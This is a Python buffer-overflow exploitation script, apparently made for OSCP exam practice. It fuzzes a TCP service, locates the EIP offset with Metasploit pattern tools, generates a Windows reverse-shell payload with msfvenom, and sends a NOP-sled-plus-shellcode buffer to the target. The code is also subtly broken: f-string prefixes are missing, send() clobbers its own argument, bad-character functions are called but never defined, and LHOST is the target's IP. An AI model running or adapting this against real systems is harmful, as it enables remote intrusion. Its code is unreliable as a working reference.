#!/usr/bin/python
# Written by Momo for OSCP exam to quickly test simple buffer overflows
import sys
import time
import socket
import subprocess
import binascii
import struct
import os
from typing import Union

def run(command: str) -> None:
    print("[*] Running: {command}")
    os.system(command)


def send(data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    timeout = 5
    data = Union[bytes, str]
    s.settimeout(timeout)
    s.connect((ip, port))
    print("[*] Sent bytes: ", s.recv(1024).decode())

    if type(data) == str:
        data = data.encode()
    s.send(data)

    print("[*] Sent bytes: ", s.recv(1024).decode())
    s.close()



def fuzz():
    size = 100
    while size <= 20000:
        try:
            char = "A" * size
            print("\nSending evil buffer with %s bytes" % size)
            send(char.encode())
            time.sleep(1)
            size += 100
       
        except:
            offset = size
            print("\nFuzzing crashed at %s bytes" % str(len(char)))
            return offset
     



def pattern(offset: int) -> int:
    print("\n[*] Creating pattern with offset")
    command = f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {offset} > pattern.txt"
    run(command)

    pattern = open("pattern.txt", "r").read()
    input("Restart the debugger then continue to send pattern")

    try:
        send(pattern.encode())
    except socket.timeout:
        print("[*] Application crashed, retrieve EIP for next step")

    eip = input("Enter EIP: ")

    command = f"/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q {eip.strip()}" + " | cut -d " " -f 6 > /tmp/offset"
    run(command)

    with open("/tmp/offset", "r") as file:
        files = file.read()
        if files == "":
            print("No match")
            exit()
        else:
            offset = files.strip("\n")
            print("\n[*] Found offset at {offset}")
            return int(offset)


def shell(badchars: str):
    command = "msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={rport} EXITFUNC=thread -b \"{badchars}\" -f py > /tmp/shellcode 2>/dev/null"
    run(command)
    print("[*] Generated shellcode")


def exploit(offset: int):
    global eip_string
    eip_string = input("[*] Enter EIP address to overwrite: ").strip()

    filler = "A" * offset
    eip = struct.pack("<I", int(eip_string, 16))
    nop = binascii.unhexlify("90" * 20)

    shellcode = open("/tmp/shellcode", "rb").read()
    print("[*] Loaded shellcode")

    # if there is not enough buffer space for a shellcode
    # from pwn import asm
    # register = input("Enter payload register (esp): ").strip()
    # assembly = asm("jmp {register}; add eax, 4")
    # offset = len(filler) - len(nop) + len(shellcode)
    # buffer = nop + shellcode + filler[offset:].encode() + eip + esp.encode()

    try:
        buffer = filler.encode() + eip + nop + shellcode
        print("[*] Exploiting...")
        send(buffer)
    except socket.timeout:
        print("Timed out")

    print("[*] Payload sent!")




def esp(offset: int) -> None:
    filler = "A" * offset
    eip = "B" * 4
    esp = "C" * 500

    input("Enter to check for space on ESP")
    buffer = filler.encode() + eip.encode() + esp.encode()

    try:
        print("\nSending buffer...")
        send(buffer)
    except socket.timeout:
        print("\nBuffer sent, check ESP register")



def main() -> None:
    offset = fuzz()
    offset = pattern(offset)
    esp(offset)

    q = input("Is the payload enough to be sent in ESP (y/n): ").strip()
    pay = q.lower() == "y"

    if pay:
        badchars = badchars_esp(offset)

    else:
        badchars = badchars_not_esp(offset)

    shell(badchars)
    exploit(offset)



if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description = "BOF Testing Tool")
    parser.add_argument("--ip", help = "target ip address", required = True)
    parser.add_argument("--port", help = "target port to exploit", required = True)
    parser.add_argument("--rport", help = "reverse shell port", default = 7777)
    parser.add_argument("--interface", help = "the interface to use", default = "tun0")

    args = parser.parse_args()

    global ip, port, timeout, rport, interface
    ip: str = args.ip
    port: int = int(args.port)
    rport: int = int(args.rport)
    timeout: int = 5
    interface: str = args.interface


    main()






